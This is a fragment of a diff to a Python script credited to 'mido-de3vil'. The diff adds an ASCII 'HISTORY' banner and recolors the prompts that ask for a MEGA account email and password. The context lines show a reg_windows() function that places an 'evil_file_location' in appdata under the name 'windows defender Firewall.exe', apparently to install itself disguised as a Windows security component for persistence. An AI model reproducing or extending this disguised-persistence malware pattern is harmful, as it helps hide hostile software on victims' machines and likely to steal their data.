@@ -5,8 +5,17 @@ from datetime import datetime
 from mega import Mega
 from time import sleep
 import shutil , subprocess  ,sys
-email = input("#18ff4e email (mega account) :- ")
-password = input("password (mega password) :- ")
+banner = """\033[1;33;40m
+                                                               
+██╗  ██╗██╗███████╗████████╗ ██████╗ ██████╗ ██╗   ██╗
+██║  ██║██║██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗╚██╗ ██╔╝
+███████║██║███████╗   ██║   ██║   ██║██████╔╝ ╚████╔╝ 
+██╔══██║██║╚════██║   ██║   ██║   ██║██╔══██╗  ╚██╔╝  
+██║  ██║██║███████║   ██║   ╚██████╔╝██║  ██║   ██║   
+╚═╝  ╚═╝╚═╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   By: mido-de3vil \033[0m 1;33;40m 
+"""
+email = input("\033[1;37;40m email (mega account) :- ")
+password = input("\033[1;37;40m password (mega password) :- ")
 def reg_windows():
 	evil_file_location = environ["appdata"] + "\\windows defender Firewall.exe"
 	if not path.exists(evil_file_location):
